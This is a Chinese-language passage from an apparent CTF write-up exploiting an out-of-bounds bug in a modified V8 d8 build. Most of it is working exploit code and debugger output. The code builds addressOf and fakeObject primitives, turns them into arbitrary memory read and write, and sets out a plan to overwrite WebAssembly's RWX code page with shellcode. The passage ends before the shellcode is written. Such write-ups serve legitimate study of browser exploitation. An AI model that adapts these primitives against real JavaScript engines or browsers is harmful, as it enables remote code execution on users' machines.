<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flo_arr = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line">obj_arr_map=obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line">flo_arr_map=flo_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;obj_arr_map:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(obj_arr_map)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flo_arr_map:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(flo_arr_map)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> f64[<span class="number">0</span>] = f;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  bigUint64[<span class="number">0</span>] = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//leak obj memory address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line"></span><br><span class="line">  obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> obj_addr=<span class="title function_">hex</span>(<span class="title function_">f2i</span>(obj_arr[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj_addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fake obj by addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  flo_arr[<span class="number">0</span>]=<span class="title function_">i2f</span>(addr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fake_obj=flo_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test_obj=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(test_obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test_obj_addr=<span class="title function_">addressOf</span>(test_obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leak obj addr:0x&quot;</span>+test_obj_addr);</span><br></pre></td></tr></table></figure>

<p>成功泄露 testobj地址 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ v8 git:(6dc88c191f) ✗ ./out/x64_startctf.release/d8 --allow-natives-syntax ./test.js</span><br><span class="line"></span><br><span class="line">obj_arr_map:0x3fa5718c2f79</span><br><span class="line"></span><br><span class="line">flo_arr_map:0x3fa5718c2ed9</span><br><span class="line"></span><br><span class="line">====================================</span><br><span class="line"></span><br><span class="line">0x0f696c58edc9 &lt;Object map = 0x3fa5718c0459&gt;</span><br><span class="line"></span><br><span class="line">leak obj addr:0xf696c58edc9</span><br></pre></td></tr></table></figure>

<h5 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h5><p>实现任意地址读写可以通过fake一个对象,这个对象的任何属性我们都是可控的,然后将elements字段修改为我们要读取或修改的内存地址,就可以实现任意地址读写. 但是有几个问题需要解决,需要查找elements的内存地址,可以通过elements字段与map字段的偏移计算. 可以看出,elements字段为0x2b131b9cec19,位于map字段的低地址处,与存储map字段的地址:0x2b131b9cec48,偏移为0x10. </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2b131b9cec49</span></span><br><span class="line"></span><br><span class="line">0x2b131b9cec49: [JSArray]</span><br><span class="line"></span><br><span class="line"> \- map: 0x14e6ac9c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line"> \- prototype: 0x3727cfcd1111 &lt;JSArray[0]&gt;</span><br><span class="line"></span><br><span class="line"> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"></span><br><span class="line"> \- length: 4</span><br><span class="line"></span><br><span class="line"> \- properties: 0x00a2a3840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line"></span><br><span class="line">  \#length: 0x373c6a3001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line"></span><br><span class="line">​      0: 1</span><br><span class="line"></span><br><span class="line">​      1: 2</span><br><span class="line"></span><br><span class="line">​      2: 3</span><br><span class="line"></span><br><span class="line">​      3: 1.1</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec48</span></span><br><span class="line"></span><br><span class="line">00:0000│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401</span><br><span class="line"></span><br><span class="line">01:0008│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408</span><br><span class="line"></span><br><span class="line">02:0010│ 0x2b131b9cec58 —▸ 0x2b131b9cec19 ◂— 0xa2a38414</span><br><span class="line"></span><br><span class="line">03:0018│ 0x2b131b9cec60 ◂— 0x400000000</span><br><span class="line"></span><br><span class="line">04:0020│ 0x2b131b9cec68 ◂— 0x0</span><br><span class="line"></span><br><span class="line">... ↓   3 skipped</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec18</span></span><br><span class="line"></span><br><span class="line">00:0000│ 0x2b131b9cec18 —▸ 0xa2a38414f9 ◂— 0xa2a38401</span><br><span class="line"></span><br><span class="line">01:0008│ 0x2b131b9cec20 ◂— 0x400000000</span><br><span class="line"></span><br><span class="line">02:0010│ 0x2b131b9cec28 ◂— 0x3ff0000000000000</span><br><span class="line"></span><br><span class="line">03:0018│ 0x2b131b9cec30 ◂— 0x4000000000000000</span><br><span class="line"></span><br><span class="line">04:0020│ 0x2b131b9cec38 ◂— 0x4008000000000000</span><br><span class="line"></span><br><span class="line">05:0028│ 0x2b131b9cec40 ◂— 0x3ff199999999999a</span><br><span class="line"></span><br><span class="line">06:0030│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401</span><br><span class="line"></span><br><span class="line">07:0038│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408</span><br></pre></td></tr></table></figure>

<p>知道了变量的内存结构,下面开始手动构造一个arr,通过addressof获取这个变量elements元素值的地址,并将其fake为一个对象.然后通过fake_arr修改fake对象的elements字段,并通过fake对象读取或写入,可以实现任意地址的读写操作. </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//leak obj memory address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line"></span><br><span class="line">  obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> obj_addr=obj_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f2i</span>(obj_addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fake obj by addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  flo_arr[<span class="number">0</span>]=<span class="title function_">i2f</span>(addr);</span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fake_obj=flo_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  fake_arr[<span class="number">2</span>]=<span class="title function_">i2f</span>(addr-<span class="number">0x10n</span>+<span class="number">0x1n</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;elements:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(fake_arr[<span class="number">2</span>])));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> ret_data=<span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;read addr:0x:&quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; val:0x&quot;</span>+<span class="title function_">hex</span>(ret_data));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret_data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line"></span><br><span class="line">  fake_arr[<span class="number">2</span>]=<span class="title function_">i2f</span>(addr-<span class="number">0x10n</span>+<span class="number">0x1n</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;elements:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(fake_arr[<span class="number">2</span>])));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  fake_obj[<span class="number">0</span>]=<span class="title function_">i2f</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;write addr:0x&quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; val:0x&quot;</span>+<span class="title function_">hex</span>(data));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">fake_arr=[</span><br><span class="line"></span><br><span class="line">  flo_arr_map,</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line"></span><br><span class="line"> <span class="number">1.1</span>,</span><br><span class="line"></span><br><span class="line"> <span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_addr=<span class="title function_">addressOf</span>(fake_arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//get elements:value &amp; fake obj</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_addr=fake_addr-<span class="number">0x30n</span>;</span><br><span class="line"></span><br><span class="line">fake_obj=<span class="title function_">fakeObject</span>(fake_obj_addr);</span><br></pre></td></tr></table></figure>



<h5 id="通过wasm执行shellcode"><a href="#通过wasm执行shellcode" class="headerlink" title="通过wasm执行shellcode"></a>通过wasm执行shellcode</h5><p>wasm可以将js生成为机器码执行,运行时会开辟一段具有rwxp属性的内存空间用于执行wasm code,但是本身无法调用一些系统库,因为做了限制,调用一些系统库会报错,但是我们可以找到这个内存空间,将自己的shellcode写入其中,覆盖wasm code,然后调用wasm执行. wasm demo，可以将c 转换为wasm code的网站:<a target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/">https://wasdk.github.io/WasmFiddle/</a> </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int <span class="title function_">main</span>(<span class="params"></span>) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(f_addr));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="number">0x07a6bbc611f9</span> &lt;<span class="title class_">JSFunction</span> <span class="number">0</span> (sfi = <span class="number">0x7a6bbc611c1</span>)&gt;</span><br><span class="line"></span><br><span class="line">wasm func <span class="attr">addr</span>: <span class="number">0x7a6bbc611f9</span></span><br></pre></td></tr></table></figure>

<p>使用vmmap命令可以看到这个内存空间 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x2b7465e6a000   0x2b7465e6b000 rwxp   1000 0   [anon_2b7465e6a]</span><br></pre></td></tr></table></figure>

<p>这片内存空间肯定是跟我们输出的函数地址是有关联的,因为wasm会在这片空间中执行. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x07a6bbc611f9</span><br><span class="line"></span><br><span class="line">0x7a6bbc611f9: [Function] in OldSpace</span><br><span class="line"></span><br><span class="line"> - map: 0x123928784379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line"> - prototype: 0x07a6bbc42109 &lt;JSFunction (sfi = 0x2e1f8d0c3b29)&gt;</span><br><span class="line"></span><br><span class="line"> - elements: 0x39e2f2600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"></span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"></span><br><span class="line"> - shared_info: 0x07a6bbc611c1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"></span><br><span class="line"> - name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"></span><br><span class="line"> - context: 0x07a6bbc41869 &lt;NativeContext[246]&gt;</span><br><span class="line"></span><br><span class="line"> - code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"></span><br><span class="line"> - WASM instance 0x7a6bbc61001</span><br><span class="line"></span><br><span class="line"> - WASM function index 0</span><br><span class="line"></span><br><span class="line"> - properties: 0x39e2f2600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line"></span><br><span class="line"> #length: 0x2e1f8d0c04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"></span><br><span class="line"> #name: 0x2e1f8d0c0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"></span><br><span class="line"> #arguments: 0x2e1f8d0c0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"></span><br><span class="line"> #caller: 0x2e1f8d0c03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> \- feedback vector: not available</span><br></pre></td></tr></table></figure>

<p>通过fun_addr-&gt;share_info-&gt;data-&gt;instance+0x88这个结构,最终找到的这块内存的起始地址, 或者通过wasmInstance+0x88也可以. </p>
